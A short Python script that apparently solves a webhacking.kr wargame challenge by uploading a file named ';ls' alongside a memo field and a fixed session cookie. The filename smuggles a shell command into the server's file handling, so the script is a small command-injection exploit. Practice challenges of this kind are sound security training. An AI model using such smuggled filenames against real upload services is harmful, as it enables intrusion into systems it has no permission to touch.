import requests

url =  "http://webhacking.kr/challenge/bonus/bonus-12/index.php"

data = {
	"memo":"hackyu1"
}
files={
	"upfile": open(';ls','rb')
}

headers = {
	"Cookie":"PHPSESSID=796c524a5dee9f2dd841854840012bb1",
	"Host":"webhacking.kr"
}


req = requests.post(url, data=data,files=files,headers=headers)
print repr(req.content)